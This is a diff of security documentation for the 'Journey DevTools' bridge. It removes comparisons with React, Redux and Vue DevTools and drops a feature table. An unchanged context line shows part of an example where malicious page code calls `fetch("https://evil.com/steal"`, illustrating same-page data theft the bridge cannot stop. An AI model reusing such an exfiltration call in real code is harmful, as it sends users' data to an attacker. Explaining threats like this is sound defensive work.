@@ -2,7 +2,7 @@
 
 ## Overview
 
-The Journey DevTools bridge follows the **same security architecture as React DevTools, Redux DevTools, and Vue DevTools**. It provides origin isolation and developer workflow safety, but does not (and cannot) protect against malicious code running in the same page context.
+The Journey DevTools bridge provides origin isolation and developer workflow safety. It does not (and cannot) protect against malicious code running in the same page context.
 
 ## What is Protected
 
@@ -67,7 +67,7 @@ fetch("https://evil.com/steal", {
 });
 ```
 
-The devtools bridge uses `window.postMessage` for extension ↔ page communication (like React/Redux/Vue DevTools). This means page scripts can see messages, but **this doesn't matter** because malicious code already has direct access to your machine instances.
+The devtools bridge uses `window.postMessage` for extension ↔ page communication. This means page scripts can see messages, but **this doesn't matter** because malicious code already has direct access to your machine instances.
 
 ### ❌ XSS Vulnerabilities
 
@@ -98,16 +98,6 @@ Add other directives only for concrete application needs. If a dev-only integrat
 ### ❌ Physical Access to Debug Sessions
 
 If someone has physical access to a machine with devtools open, they can send commands. This is true for all browser devtools.
-
-## Comparison with Other DevTools
-
-| Feature                   | Journey DevTools | React DevTools | Redux DevTools | Vue DevTools |
-| ------------------------- | ---------------- | -------------- | -------------- | ------------ |
-| Origin Isolation          | ✅               | ✅             | ✅             | ✅           |
-| Rate Limiting             | ✅               | ❌             | ❌             | ❌           |
-| Payload Validation        | ✅ (Deep)        | ✅ (Basic)     | ✅ (Basic)     | ✅ (Basic)   |
-| Production Default        | Disabled         | Enabled        | Enabled        | Enabled      |
-| Same-Page Code Protection | ❌               | ❌             | ❌             | ❌           |
 
 ## Best Practices
 
